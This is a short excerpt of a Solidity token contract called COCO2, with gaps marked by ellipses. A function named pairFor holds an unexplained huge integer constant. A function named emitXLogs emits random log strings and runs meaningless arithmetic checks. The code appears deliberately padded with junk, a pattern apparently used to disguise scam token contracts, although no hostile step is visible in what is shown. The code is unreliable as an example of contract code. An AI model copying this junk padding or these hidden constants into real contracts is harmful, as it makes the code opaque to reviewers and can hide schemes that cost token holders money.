...
contract COCO2 is IERC20 {
    ...
    */
    function pairFor() public view returns (bool) {
      uint256 slt = 7625355341478926178476459425880757943419850479843521801024540533933;
    ...
    function emitXLogs() external {
      ...
      emit log("fSgJ");
      emit log("qH");
      uint256 mufwrws = 26 * 75 % 91;
      uint256 bqrhmleyu = 22 % 83 + 59 % 88;
      uint256 hfihyqlkd = 21 * 46;
      uint256 mmjnykmn = 44 % 85 * 57 * 73;
      if (mufwrws == 41 + 75 % 86 % 9 && bqrhmleyu == 91 * 67 && hfihyqlkd == 10 * 99 * 71 % 6 && mmjnykmn == 14 * 69 % 9 * 95) return;
    }
